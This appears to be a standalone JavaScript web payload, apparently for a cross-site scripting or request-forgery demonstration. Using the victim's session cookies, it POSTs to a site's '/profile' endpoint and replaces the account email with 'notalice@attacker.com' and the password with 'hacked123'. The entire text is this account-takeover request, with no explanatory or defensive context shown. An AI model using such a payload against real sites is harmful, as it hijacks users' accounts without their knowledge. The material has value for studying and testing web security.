fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=notalice@attacker.com&password=hacked123",
  credentials: "include"
});
